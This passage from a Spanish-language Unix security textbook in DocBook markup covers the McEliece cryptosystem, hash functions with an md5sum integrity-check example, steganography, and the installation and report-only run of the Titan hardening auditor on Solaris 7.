fileref="unixsec481x.gif"></graphic></informalequation> una matriz aleatoria no singular de orden <informalequation><graphic 
fileref="unixsec482x.gif"></graphic></informalequation>, y <informalequation><graphic 
fileref="unixsec483x.gif"></graphic></informalequation> una matriz de permutaciones de orden <informalequation><graphic 
fileref="unixsec484x.gif"></graphic></informalequation>.
Todos los usuarios del sistema mantienen sus respectivos <informalequation><graphic 
fileref="unixsec485x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec486x.gif"></graphic></informalequation> p&#x00FA;blicos, mientras que las matrices <informalequation><graphic 
fileref="unixsec487x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec488x.gif"></graphic></informalequation> y
<informalequation><graphic 
fileref="unixsec489x.gif"></graphic></informalequation> ser&#x00E1;n secretas.
<!--br/-->
<!--br/-->Supongamos que un emisor A quiere enviar un mensaje al receptor B. Para ello, representar&#x00E1; el mensaje
como un conjunto de cadenas binarias, <informalequation><graphic 
fileref="unixsec490x.gif"></graphic></informalequation>, de longitud <informalequation><graphic 
fileref="unixsec491x.gif"></graphic></informalequation> bits, y enviar&#x00E1; el mensaje cifrado de <informalequation><graphic 
fileref="unixsec492x.gif"></graphic></informalequation>
bits
</para><section role="center"><title/>
<!--l. 704--><para> <informalequation><graphic 
fileref="unixsec493x.gif"></graphic></informalequation>,</para></section>

<!--l. 707--><para>siendo <informalequation><graphic 
fileref="unixsec494x.gif"></graphic></informalequation> un vector de longitud <informalequation><graphic 
fileref="unixsec495x.gif"></graphic></informalequation> y peso <informalequation><graphic 
fileref="unixsec496x.gif"></graphic></informalequation> que di&#xFB01;culta el criptoan&#x00E1;lisis de un potencial atacante, por
razones en las que no vamos a entrar.
<!--br/-->
<!--br/-->Cuando B recibe el mensaje, ha de calcular
</para><section role="center"><title/>
<!--l. 711--><para> <informalequation><graphic 
fileref="unixsec497x.gif"></graphic></informalequation></para></section>
<!--l. 715--><para>utilzando sus matrices <informalequation><graphic 
fileref="unixsec498x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec499x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec500x.gif"></graphic></informalequation> (que recordemos son privadas). El vector <informalequation><graphic 
fileref="unixsec501x.gif"></graphic></informalequation> se calcula como
</para><section role="center"><title/>
<!--l. 717--><para> <informalequation><graphic 
fileref="unixsec502x.gif"></graphic></informalequation></para></section>
<!--l. 720--><para>y tiene tambi&#x00E9;n un peso inferior a <informalequation><graphic 
fileref="unixsec503x.gif"></graphic></informalequation>.
<!--br/-->
<!--br/-->Llamando <informalequation><graphic 
fileref="unixsec504x.gif"></graphic></informalequation>, el receptor B puede calcular ahora el mensaje original, a partir de
</para><section role="center"><title/>
<!--l. 723--><para> <informalequation><graphic 
fileref="unixsec505x.gif"></graphic></informalequation></para></section>
<!--l. 726--><para>(&#x00A1;recordemos una vez m&#x00E1;s que <informalequation><graphic 
fileref="unixsec506x.gif"></graphic></informalequation> ha de ser privada para cada usuario!). Hay que resaltar, por
&#x00FA;ltimo, que aunque el criptosistema de McEliece no ha sido completamente acogido por la
comunidad criptol&#x00F3;gica, es muy importante el estudio que desde la presentaci&#x00F3;n del sistema en
1978 se est&#x00E1; haciendo para el desarrollo de sistemas de clave p&#x00FA;blica basados en la Teor&#x02CA;&#x0131;a de la
Codi&#xFB01;caci&#x00F3;n.
  </para></section><!--end subsection--></section><!--end section--><!--l. 732--><section 
role="section"><title><abbrev role="title-mark">20.8</abbrev><anchor 
   id="x1-31900020.8"  ></anchor>Funciones resumen</title>
<!--l. 733--><para>  Matem&#x00E1;ticamente podemos de&#xFB01;nir las funciones resumen (hash functions) como proyecciones de un
conjunto, generalmente con un n&#x00FA;mero elevado de elementos (incluso in&#xFB01;nitos), sobre un conjunto de
tama~no &#xFB01;jo y mucho m&#x00E1;s peque~no que el anterior; por ejemplo, podemos de&#xFB01;nir la siguiente funci&#x00F3;n
resumen, que va de un conjunto con un n&#x00FA;mero in&#xFB01;nito de elementos a otro con &#x00FA;nicamente
10:
</para><section role="center"><title/>
<!--l. 739--><para> <informalequation><graphic 
fileref="unixsec507x.gif"></graphic></informalequation> <informalequation><graphic 
fileref="unixsec508x.gif"></graphic></informalequation> <informalequation><graphic 
fileref="unixsec509x.gif"></graphic></informalequation> <informalequation><graphic 
fileref="unixsec510x.gif"></graphic></informalequation> <informalequation><graphic 
fileref="unixsec511x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec512x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec513x.gif"></graphic></informalequation></para></section>
<!--l. 742--><para>Sin embargo, aunque la anterior sea una funci&#x00F3;n resumen en sentido estricto, no es especialmente interesante
en aplicaciones criptogr&#x00E1;&#xFB01;cas; para serlo, habr&#x02CA;&#x0131;a de cumplir los siguientes requisitos:
     </para><itemizedlist>
     <listitem>
     <!--l. 746--><para>La entrada puede ser de un tama~no indeterminado.
     </para></listitem>
     <listitem>
     <!--l. 747--><para>La salida es de un tama~no &#xFB01;jo, varios &#x00F3;rdenes de magnitud m&#x00E1;s peque~no que el anterior.
     </para></listitem>
     <listitem>
     <!--l. 749--><para>Para un cierto <informalequation><graphic 
fileref="unixsec514x.gif"></graphic></informalequation>, calcular <informalequation><graphic 
fileref="unixsec515x.gif"></graphic></informalequation> es computacionalmente barato.
     </para></listitem>
     <listitem>
     <!--l. 750--><para><informalequation><graphic 
fileref="unixsec516x.gif"></graphic></informalequation> es de un solo sentido.

     </para></listitem>
     <listitem>
     <!--l. 751--><para><informalequation><graphic 
fileref="unixsec517x.gif"></graphic></informalequation> no presenta colisiones.</para></listitem></itemizedlist>
<!--l. 753--><para>El que una funci&#x00F3;n hash sea de un solo sentido (lo que se denomina One&#x2013;Way hash function) no implica m&#x00E1;s
que a partir del valor de <informalequation><graphic 
fileref="unixsec518x.gif"></graphic></informalequation> no puedo obtener el de <informalequation><graphic 
fileref="unixsec519x.gif"></graphic></informalequation>: no existe <informalequation><graphic 
fileref="unixsec520x.gif"></graphic></informalequation>, o su c&#x00E1;lculo es
computacionalmente dif&#x02CA;&#x0131;cil. Las colisiones en una funci&#x00F3;n resumen se producen cuando para dos entradas
diferentes <informalequation><graphic 
fileref="unixsec521x.gif"></graphic></informalequation> e <informalequation><graphic 
fileref="unixsec522x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec523x.gif"></graphic></informalequation>, y se habla de funciones hash d&#x00E9;bilmente libres de colisiones
(weakly collision free) cuando es computacionalmente imposible encontrar dos elementos <informalequation><graphic 
fileref="unixsec524x.gif"></graphic></informalequation> e <informalequation><graphic 
fileref="unixsec525x.gif"></graphic></informalequation>
tales que cumplan <informalequation><graphic 
fileref="unixsec526x.gif"></graphic></informalequation>; si aparte de computacionalmente imposible tambi&#x00E9;n lo es
matem&#x00E1;timamente, se habla de funciones resumen fuertemente libres de colisiones (strongly
collision-free).
<!--br/-->
<!--br/-->Una de las aplicaciones criptogr&#x00E1;&#xFB01;cas m&#x00E1;s importante de las funciones resumen es sin duda la veri&#xFB01;caci&#x00F3;n de
integridad de archivos; aunque ya hemos hablado de los veri&#xFB01;cadores de integridad tipo Tripwire en el
cap&#x02CA;&#x0131;tulo dedicado a los sistemas de detecci&#x00F3;n de intrusos, la idea es sencilla: en un sistema del que tengamos
constancia que est&#x00E1; &#x2018;limpio&#x2019; (esto es, que no ha sido troyanizado o modi&#xFB01;cado de cualquier
forma por un pirata) podemos generar res&#x00FA;menes de todos los &#xFB01;cheros que consideremos clave
para el correcto funcionamiento de la m&#x00E1;quina y guardar dichos res&#x00FA;menes &#x2013; como ya indica su
nombre, mucho m&#x00E1;s cortos que los archivos originales &#x2013; en un dispositivo de s&#x00F3;lo lectura como un
CD-ROM. Peri&#x00F3;dicamente, o cuando sospechemos que la integridad de nuestro entorno ha sido
violada, podemos volver a generar los res&#x00FA;menes y comparar su resultado con el almacenado
previamente: si no coinciden, podemos estar seguros (o casi seguros) de que el &#xFB01;chero ha sido
modi&#xFB01;cado.
<!--br/-->
<!--br/-->Para este tipo de aplicaciones se suele utilizar la funci&#x00F3;n resumen MD5, dise~nada por Ronald Rivest y que
viene implementada &#x2018;de serie&#x2019; en muchos clones de Unix, como Solaris o Linux (&#x00F3;rdenes &#x2018;md5&#x2019; o
&#x2018;md5sum&#x2019;):

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;echo&#x00A0;&#x0022;Esto&#x00A0;es&#x00A0;una&#x00A0;prueba&#x0022;&#x00A0;&#x003E;/tmp/salida
&#x00A0;sluisa:~$&#x00A0;md5sum&#x00A0;/tmp/salida
&#x00A0;3f8a62a7db3b276342d4c65dba2a5adf&#x00A0;&#x00A0;/tmp/salida
&#x00A0;luisa:~$&#x00A0;echo&#x00A0;&#x0022;Ahora&#x00A0;modifico&#x00A0;el&#x00A0;fichero&#x0022;&#x00A0;&#x003E;&#x003E;/tmp/salida
&#x00A0;luisa:~$&#x00A0;md5sum&#x00A0;/tmp/salida
&#x00A0;1f523e767e470d8f23d4378d74817825&#x00A0;&#x00A0;/tmp/salida
&#x00A0;luisa:~$
</literallayout>
<!--l. 795--><para>Otra aplicaci&#x00F3;n importante de las funciones resumen es la &#xFB01;rma digital de mensajes &#x2013; documentos &#x2013; y su
timestamping; en el primer caso, como los algoritmos de &#xFB01;rma digital suelen ser lentos, o al menos m&#x00E1;s
lentos que las funciones hash, es habitual calcular la &#xFB01;rma digital de un resumen del &#xFB01;chero original, en
lugar de hacer el c&#x00E1;lculo sobre el propio &#xFB01;chero (evidentemente, de tama~no mayor que su resumen). Con
respecto al timestamping, las funciones hash son &#x00FA;tiles porque permiten publicar un resumen de un
documento sin publicar su contenido, lo cual permite a una parte obtener un timestamp de un documento
sin que la autoridad de timestamp conozca el contenido del mismo, pero asegur&#x00E1;ndose la validez
del procedimiento en caso de repudio; en ambos casos, tanto en la &#xFB01;rma digital como en el
timestamping, trabajar con el resumen es completamente equivalente a trabajar con el archivo
original.
  </para></section><!--end section--><!--l. 808--><section 
role="section"><title><abbrev role="title-mark">20.9</abbrev><anchor 
   id="x1-32000020.9"  ></anchor>Esteganograf&#x02CA;&#x0131;a</title>
<!--l. 809--><para>  La esteganograf&#x02CA;&#x0131;a (tambi&#x00E9;n llamada cifra encubierta, <citation>[?]</citation>) es la ciencia que estudia los procedimientos
encaminados a ocultar la existencia de un mensaje en lugar de ocultar su contenido; mientras que la
criptograf&#x02CA;&#x0131;a pretende que un atacante que consigue un mensaje no sea capaz de averiguar su contenido, el
objetivo de la esteganograf&#x02CA;&#x0131;a es ocultar ese mensaje dentro de otro sin informaci&#x00F3;n importante, de forma
que el atacante ni siquiera se entere de la existencia de dicha informaci&#x00F3;n oculta. No se trata de sustituir al
cifrado convencional sino de complementarlo: ocultar un mensaje reduce las posibilidades de que sea
descubierto; no obstante, si lo es, el que ese mensaje haya sido cifrado introduce un nivel adicional de
seguridad.
<!--br/-->
<!--br/-->A lo largo de la historia han existido multitud de m&#x00E9;todos para ocultar informaci&#x00F3;n. Quiz&#x00E1;s los m&#x00E1;s conocidos
hayan sido la tinta invisible, muy utilizada durante la Segunda Guerra Mundial, o las marcas de cualquier
tipo sobre ciertos caracteres (desde peque~nos pinchazos de al&#xFB01;ler hasta trazos a l&#x00E1;piz que marcan un
mensaje oculto en un texto), pero otros mecanismos m&#x00E1;s &#x2018;extravagantes&#x2019; tambi&#x00E9;n han sido utilizados: por
ejemplo, afeitar la cabeza de un mensajero y tatuar en el cuero cabelludo el mensaje, dejando despu&#x00E9;s que
el crecimiento del pelo lo oculte; podemos repasar algunos modelos esteganogr&#x00E1;&#xFB01;cos cuanto menos curiosos
en <citation>[?]</citation>.
<!--br/-->
<!--br/-->Con el auge de la inform&#x00E1;tica, el mecanismo esteganogr&#x00E1;&#xFB01;co m&#x00E1;s extendido est&#x00E1; basado en las im&#x00E1;genes digitales
y su excelente capacidad para ocultar informaci&#x00F3;n; aunque existen varias formas de conseguirlo (<citation>[?]</citation>), la m&#x00E1;s
b&#x00E1;sica consiste simplemente en sustituir el bit menos signi&#xFB01;cativo de cada byte por los bits del mensaje que
queremos ocultar; dado que casi todos los est&#x00E1;ndares gr&#x00E1;&#xFB01;cos tienen una graduaci&#x00F3;n de colores mayor de lo
que el ojo humano puede apreciar, la imagen no cambiar&#x00E1; su apariencia de forma notable. Otros elementos
donde ocultar informaci&#x00F3;n son las se~nales de audio y video y el propio texto (<citation>[?]</citation>); aunque hist&#x00F3;ricamente
nunca han estado tan extendidas como la anterior, en los &#x00FA;ltimos tiempos el inter&#x00E9;s por los mecanismos de
ocultaci&#x00F3;n de informaci&#x00F3;n en formatos de audio (principalmente MP3) y video ha ido en aumento.
Y no es de extra~nar: a nadie se le escapa que con la cantidad de protocolos peer to peer de
intercambio de archivos (e-Donkey, Morpheus&#x2026;) que existen en la actualidad, y que son usados por
millones de usuarios para intercambiar &#xFB01;cheros MP3 y DIVX a trav&#x00E9;s de la red, el volumen
de informaci&#x00F3;n que puede viajar camu&#xFB02;ada en los mismos es impresionante. Esto, que a la
mayor parte de los mortales nos da un poco igual, es un &#x00E1;rea de gran inter&#x00E9;s para las agencias de
inteligencia de todo el mundo (muy en especial desde los desgraciados sucesos del once de

septiembre pasado), debido al peligro que entra~na el intercambio de informaci&#x00F3;n discreto, r&#x00E1;pido y
efectivo que puede establecerse entre miembros de redes terroristas desde cualquier punto del
planeta, sin m&#x00E1;s que un PC conectado a Internet y un programa cliente de cualquiera de estos
protocolos.


</para><!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-32100021"  ></anchor>Algunas herramientas de seguridad</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">21.1</abbrev><anchor 
   id="x1-32200021.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  &#x00BF;Por qu&#x00E9; utilizar herramientas de seguridad en los sistemas Unix? Ning&#x00FA;n
sistema operativo se puede considerar &#x2018;seguro&#x2019; tal y como se instala por
defecto <anchor 
   id="x1-322001f1"  ></anchor><footnote><para>     &#x00A1;Algunos no pueden considerarse &#x2018;seguros&#x2019; nunca!</para></footnote>;
normalmente, cualquier distribuci&#x00F3;n de un sistema se instala pensando en proporcionar los m&#x02CA;&#x0131;nimos
problemas a un administrador que desee poner la m&#x00E1;quina a trabajar inmediatamente, sin tener
que preocuparse de la seguridad. Es una cuesti&#x00F3;n de puro marketing: imaginemos un sistema
Unix que por defecto se instalara en su modo m&#x00E1;s restrictivo en cuanto a seguridad; cuando
el administrador desee ponerlo en funcionamiento conect&#x00E1;ndolo a una red, ofreciendo ciertos
servicios, gestionando usuarios y perif&#x00E9;ricos&#x2026;deber&#x00E1; conocer muy bien al sistema, ya que ha
de dar expl&#x02CA;&#x0131;citamente los permisos necesarios para realizar cada tarea, con la consiguiente
p&#x00E9;rdida de tiempo. Es mucho m&#x00E1;s productivo para cualquier empresa desarrolladora de sistemas
proporcionarlos completamente abiertos, de forma que el administrador no tenga que preocuparse
mucho de c&#x00F3;mo funciona cada parte del sistema que acaba de instalar: simplemente inserta
el CDROM original, el software se instala, y todo funciona a la primera, aparentemente sin
problemas&#x2026;
<!--br/-->
<!--br/-->Esta pol&#x02CA;&#x0131;tica, que lamentablemente siguen casi todas las empresas desarrolladoras, convierte a un sistema
Unix que no se haya con&#xFB01;gurado m&#x02CA;&#x0131;nimamente en un f&#x00E1;cil objetivo para cualquier atacante. Es m&#x00E1;s, la
complejidad de Unix hace que un administrador que para aumentar la seguridad de su sistema se limite a
cerrar ciertos servicios de red o detener algunos demonios obtenga una sensaci&#x00F3;n de falsa seguridad: esta
persona va a pensar que su sistema es seguro simplemente por realizar un par de modi&#xFB01;caciones en &#x00E9;l, cosa
que es completamente falsa.
  </para></section><!--end section--><!--l. 29--><section 
role="section"><title><abbrev role="title-mark">21.2</abbrev><anchor 
   id="x1-32300021.2"  ></anchor>Titan</title>
<!--l. 30--><para>  Para corroborar la inseguridad de los sistemas Unix instalados tal y como se distribuyen, o
m&#x02CA;&#x0131;nimamente con&#xFB01;gurados, hemos hecho la prueba con uno de los sistemas considerados m&#x00E1;s seguros:
Solaris, de la empresa Sun Microsystems, Inc.. Hemos instalado Solaris 7 sobre un PC, cerrado la mayor&#x02CA;&#x0131;a
de servicios ofrecidos (en /etc/inetd.conf), y controlado el acceso a otros (telnet, finger, ftp&#x2026;)
mediante TCP Wrappers: justo lo que la mayor parte de administradores har&#x02CA;&#x0131;an antes de poner el sistema
a funcionar. Tras estos pasos, hemos ejecutado el programa de auditor&#x02CA;&#x0131;a autom&#x00E1;tica Titan, que detecta
problemas de seguridad en la m&#x00E1;quina local (para m&#x00E1;s informaci&#x00F3;n sobre este software se puede consultar
<citation>[?]</citation>).
  </para><!--l. 41--><section 
role="subsubsection"><title><anchor 
   id="x1-32400021.2"  ></anchor>Instalaci&#x00F3;n de Titan</title>
<!--l. 42--><para>  Hemos elegido Titan justamente por ser uno de los programas m&#x00E1;s f&#x00E1;cilmente instalables sobre SunOS o
Solaris: al tratarse de un conjunto de shellscripts, el administrador no ha de preocuparse por ning&#x00FA;n proceso
de compilaci&#x00F3;n (con los posibles errores que &#x00E9;ste puede causar), ni conocer t&#x00E9;cnicas avanzadas de seguridad
para poder utilizarlo (como otros programas que presentan una multitud de opciones diferentes que se
pueden combinar entre ellas, de forma que quien los quiera utilizar debe conocer bastante bien ciertos
t&#x00E9;rminos de Unix y de la seguridad, que no suelen ser triviales). Tanto la instalaci&#x00F3;n de Titan como su
ejecuci&#x00F3;n son muy sencillos.
<!--br/-->
<!--br/-->Para instalar Titan, una vez desempaquetado el &#xFB01;chero, hemos de ejecutar simplemente
<!--br/-->Titan-Config, con la opci&#x00F3;n -i (la opci&#x00F3;n -d desinstala el software. El programa de instalaci&#x00F3;n nos
preguntar&#x00E1; si deseamos hacer copias de seguridad de los &#xFB01;cheros que se modi&#xFB01;quen al ejecutar Titan; por
nuestra seguridad, podemos decirle que s&#x02CA;&#x0131; (y):

  </para><literallayout role="verbatim">
&#x00A0;anita:/export/home/toni/Security/Tools#&#x00A0;gzip&#x00A0;-d&#x00A0;Titan,v3.0.FCS.tar.gz
&#x00A0;anita:/export/home/toni/Security/Tools#&#x00A0;tar&#x00A0;xvf&#x00A0;Titan,v3.0.FCS.tar
&#x00A0;anita:/export/home/toni/Security/Tools#&#x00A0;cd&#x00A0;Titan,v3.0.FCS
&#x00A0;anita:/export/home/toni/Security/Tools/Titan,v3.0.FCS#&#x00A0;./Titan-Config&#x00A0;-i
&#x00A0;checking&#x00A0;for&#x00A0;dependencies...
&#x00A0;finding&#x00A0;out&#x00A0;where&#x00A0;we&#x00A0;are...
&#x00A0;we&#x00A0;are&#x00A0;in&#x00A0;&#x2019;/export/home/toni/Security/Tools/Titan,v3.0.FCS&#x2019;
&#x00A0;
&#x00A0;checking&#x00A0;out&#x00A0;your&#x00A0;system...
&#x00A0;this&#x00A0;system&#x00A0;runs:&#x00A0;SunOS-5.7-i86pc
&#x00A0;we&#x00A0;will&#x00A0;be&#x00A0;using:&#x00A0;sol2x86
&#x00A0;
&#x00A0;setting&#x00A0;up&#x00A0;links...
&#x00A0;removing&#x00A0;old&#x00A0;links...
&#x00A0;linking&#x00A0;bin&#x00A0;into&#x00A0;path...
&#x00A0;linking&#x00A0;lib&#x00A0;into&#x00A0;path...
&#x00A0;linking&#x00A0;logs&#x00A0;into&#x00A0;path...
&#x00A0;linking&#x00A0;src&#x00A0;into&#x00A0;path...
&#x00A0;linking&#x00A0;tmp&#x00A0;into&#x00A0;path...
&#x00A0;linking&#x00A0;done.
&#x00A0;cleaning&#x00A0;up&#x00A0;is&#x005F;root,&#x00A0;sanity&#x005F;check,&#x00A0;Titan...
&#x00A0;pulling&#x00A0;in&#x00A0;local&#x00A0;Titan&#x00A0;script...
&#x00A0;
&#x00A0;Run&#x00A0;Titan&#x00A0;utilites&#x00A0;with&#x00A0;&#x2019;Titan&#x00A0;-[v,f,i]&#x2019;&#x00A0;after&#x00A0;reading&#x00A0;the&#x00A0;Docs...
&#x00A0;OR
&#x00A0;Run&#x00A0;Titan&#x00A0;using&#x00A0;a&#x00A0;config&#x00A0;file.&#x00A0;(Titan&#x00A0;-c&#x00A0;sample.Server)&#x00A0;after&#x00A0;reading&#x00A0;the&#x00A0;Docs
&#x00A0;
&#x00A0;Titan&#x00A0;can&#x00A0;backup&#x00A0;all&#x00A0;of&#x00A0;the&#x00A0;files&#x00A0;it&#x00A0;modifies;&#x00A0;This&#x00A0;is&#x00A0;recommended
&#x00A0;proceed?&#x00A0;y/n:&#x00A0;y
&#x00A0;Okay...&#x00A0;Checking&#x00A0;for&#x00A0;backup&#x00A0;program...
&#x00A0;Found&#x00A0;backtit.sh&#x00A0;-&#x00A0;Backing&#x00A0;up&#x00A0;system&#x00A0;files&#x00A0;now...&#x00A0;This&#x00A0;might&#x00A0;take&#x00A0;a&#x00A0;while..
&#x00A0;Creating&#x00A0;backup&#x00A0;dir&#x00A0;in&#x00A0;:&#x00A0;/export/home/toni/Security/Tools/Titan,v3.0.FCS/&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;arch/sol2sun4/bin/Backup//1013990418
&#x00A0;Generating&#x00A0;listings.....
&#x00A0;Calculating&#x00A0;and&#x00A0;backing&#x00A0;up&#x00A0;files&#x00A0;now...................................&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;............&#x00A0;Done!!
&#x00A0;...
&#x00A0;...
&#x00A0;Saved&#x00A0;off&#x00A0;44&#x00A0;files&#x00A0;to:&#x00A0;/export/home/toni/Security/Tools/Titan,v3.0.FCS/&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;arch/sol2sun4/bin/Backup//1013990418
&#x00A0;See&#x00A0;details&#x00A0;in&#x00A0;savelist:&#x00A0;/export/home/toni/Security/Tools/Titan,v3.0.FCS/&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;arch/sol2sun4/bin/Backup//1013990418/../SaveList.1013990418
&#x00A0;Restore&#x00A0;by&#x00A0;running&#x00A0;/export/home/toni/Security/Tools/Titan,v3.0.FCS/&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;arch/sol2sun4/bin/lib/untit.sh&#x00A0;-[g,r]
&#x00A0;anita:/export/home/toni/Security/Tools/Titan,v3.0.FCS#
</literallayout>
<!--l. 105--><para>  Una vez instalado Titan (todo a partir del directorio actual, no genera &#xFB01;cheros en ning&#x00FA;n otro lugar de
nuestros sistemas de archivos) podemos ejecutar ya el programa de auditor&#x02CA;&#x0131;a, con la opci&#x00F3;n -v para que no
realice ning&#x00FA;n cambio en nuestro sistema, sino que simplemente se limite a informarnos de los posibles
problemas de seguridad que podemos tener; si deseamos ver el funcionamiento de cada uno
de los shellscripts invocados por Titan, podemos utilizar la opci&#x00F3;n -i, y si lo que queremos
es solucionar los problemas detectados, la opci&#x00F3;n -f (cuidado si hacemos esto, la pol&#x02CA;&#x0131;tica de
seguridad de Titan es tan estricta que podemos dejar al sistema s&#x00F3;lamente utilizable por el
root).

  </para></section><!--end subsubsection--><!--l. 115--><section 
role="subsubsection"><title><anchor 
   id="x1-32500021.2"  ></anchor>Ejecuci&#x00F3;n de Titan</title>
<!--l. 116--><para>  En nuestro caso, queremos que Titan nos informe de los problemas de seguridad que detecte, pero que
no los solucione &#x00E9;l:

  </para><literallayout role="verbatim">
&#x00A0;anita:/export/home/toni/Security/Tools/Titan,v3.0.FCS#&#x00A0;./Titan&#x00A0;-v
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/add-umask.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/add-umask.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;No&#x00A0;umask&#x00A0;file&#x00A0;/etc/init.d/umask.sh&#x00A0;found
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/adjust-arp-timers.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/adjust-arp-timers.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;
&#x00A0;Checking&#x00A0;for&#x00A0;ARP&#x00A0;timers&#x00A0;in&#x00A0;/etc/rc2.d/S69inet
&#x00A0;
&#x00A0;ARP&#x00A0;timers&#x00A0;are&#x00A0;not&#x00A0;set&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/adjust.syn-timeout.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/adjust.syn-timeout.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;ERROR&#x00A0;-&#x00A0;This&#x00A0;script&#x00A0;is&#x00A0;Only&#x00A0;needed&#x00A0;on&#x00A0;Solaris&#x00A0;2.4&#x00A0;and&#x00A0;older
&#x00A0;please&#x00A0;see&#x00A0;Sun&#x2019;s&#x00A0;patch&#x00A0;(Patch&#x00A0;103582-11&#x00A0;currently)&#x00A0;for&#x00A0;a&#x00A0;better&#x00A0;fix
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/automount.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/automount.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;File&#x00A0;/etc/rc2.d/S74autofs&#x00A0;exists...
&#x00A0;Automounter&#x00A0;=
&#x00A0;/usr/lib/autofs/automountd&#x00A0;/usr/sbin/automount&#x00A0;/usr/bin/pkill&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/create-issue.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/create-issue.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Cannot&#x00A0;read&#x00A0;/etc/issue&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
